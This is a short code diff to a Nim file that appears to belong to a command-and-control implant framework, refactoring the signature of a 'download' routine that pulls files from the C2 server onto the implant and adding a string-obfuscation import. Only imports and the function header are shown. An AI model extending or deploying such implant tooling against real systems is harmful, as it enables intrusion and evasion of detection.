@@ -1,12 +1,13 @@
 import puppy, zippy
 from strutils import toLowerAscii
 from os import fileExists
-from ../../core/webClientListener import Listener
+import ../../core/webClientListener
 from ../../util/crypto import encryptData
+from ../../util/strenc import obf
 
 # Upload a file from the C2 server to the Implant
 # From Implant's perspective this is similar to wget, but calling to the C2 server instead
-proc download*(li : Listener, cmdGuid : string,  args : varargs[string]) : string =
+proc download*(li : webClientListener.Listener, cmdGuid : string, args : seq[string]) : string =
     var 
         filePath : string
         file : string
